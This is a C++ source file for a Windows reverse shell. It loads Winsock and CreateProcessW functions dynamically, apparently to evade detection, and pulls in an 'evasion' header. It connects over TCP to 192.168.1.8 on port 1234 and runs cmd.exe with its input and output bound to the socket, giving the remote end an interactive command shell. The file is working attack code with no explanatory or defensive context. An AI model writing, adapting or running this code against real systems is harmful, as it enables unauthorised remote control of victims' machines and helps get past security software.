#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <unistd.h>
#include "includes/evasion.h"

using pWSAStartup = INT ( WINAPI * ) (
    WORD,
    LPWSADATA
);

using pWSASocketA = SOCKET ( WSAAPI * ) (
    int, 
    int, 
    int,
    LPWSAPROTOCOL_INFOA,
    GROUP,
    DWORD
);

using pWSAConnect = INT ( WSAAPI * ) (
  SOCKET, 
  const struct sockaddr *,
  int,
  LPWSABUF,
  LPWSABUF,
  LPQOS,
  LPQOS
);

using pCreateProcessW = BOOL ( WINAPI * ) (
  LPCWSTR,
  LPWSTR,
  LPSECURITY_ATTRIBUTES,
  LPSECURITY_ATTRIBUTES,
  BOOL,
  DWORD,
  LPVOID,
  LPCWSTR,
  LPSTARTUPINFOW,
  LPPROCESS_INFORMATION
);

int main() {
  HMODULE Handle_Kernel32 = GetModuleHandleW ( L"kernel32.dll" );
  HMODULE Handle_WS2      = LoadLibraryW     ( L"ws2_32.dll"   );

  pWSAStartup      dWSAStartup     = ( pWSAStartup     ) GetProcAddress ( Handle_WS2,       "WSAStartup"     );
  pWSASocketA      dWSASocketA     = ( pWSASocketA     ) GetProcAddress ( Handle_WS2,       "WSASocketA"     );
  pWSAConnect      dWSAConnect     = ( pWSAConnect     ) GetProcAddress ( Handle_WS2,       "WSAConnect"     );
  pCreateProcessW  dCreateProcessW = ( pCreateProcessW ) GetProcAddress ( Handle_Kernel32,  "CreateProcessW" );
  
  int port                   { 1234 };
  std::string_view ipAddress { "192.168.1.8" }; 

  struct networking {
    WSADATA              wsaData;
    SOCKET               windowsSocket;
    struct sockaddr_in   socketAddress;
    STARTUPINFOW         startupInformation;
    PROCESS_INFORMATION  processInformation;
  } net;

  if ( dWSAStartup ( MAKEWORD ( 2,2 ), &net.wsaData ) != 0) {
    std::cout << "Error M1:" << WSAGetLastError() << '\n';
  }

  net.windowsSocket = dWSASocketA(
    AF_INET,      
    SOCK_STREAM,  
    IPPROTO_TCP,  
    NULL,
    0,
    0
  );

  if ( net.windowsSocket == INVALID_SOCKET ) {
    std::cout << "Error M2:" << WSAGetLastError() << '\n';
  }

  net.socketAddress.sin_family      = AF_INET;
  net.socketAddress.sin_port        = htons     ( port             );
  net.socketAddress.sin_addr.s_addr = inet_addr ( ipAddress.data() );

  if (dWSAConnect (
      net.windowsSocket,
      (SOCKADDR * )&net.socketAddress,
      sizeof(net.socketAddress),
      NULL,
      NULL,
      NULL,
      NULL
    ) == SOCKET_ERROR)

  {
    std::cout << "Error M3:" << WSAGetLastError() << '\n';
  }

  SecureZeroMemory( &net.startupInformation, sizeof ( net.startupInformation ) );

  
  net.startupInformation.cb         =  sizeof ( net.startupInformation );
  net.startupInformation.hStdInput  =       ( HANDLE ) net.windowsSocket;
  net.startupInformation.hStdOutput =       ( HANDLE ) net.windowsSocket;
  net.startupInformation.hStdError  =       ( HANDLE ) net.windowsSocket;
  net.startupInformation.dwFlags    =               STARTF_USESTDHANDLES;

  std::wstring cmd { L"cmd.exe" };

  if (!dCreateProcessW(
    NULL,
    cmd.data(),
    NULL,
    NULL,
    TRUE,
    0,
    NULL,
    NULL,
    &net.startupInformation,
    &net.processInformation
    ))
    
  {
    std::cout << "Error M4:" << GetLastError() << '\n';
  }

  return EXIT_SUCCESS;
}
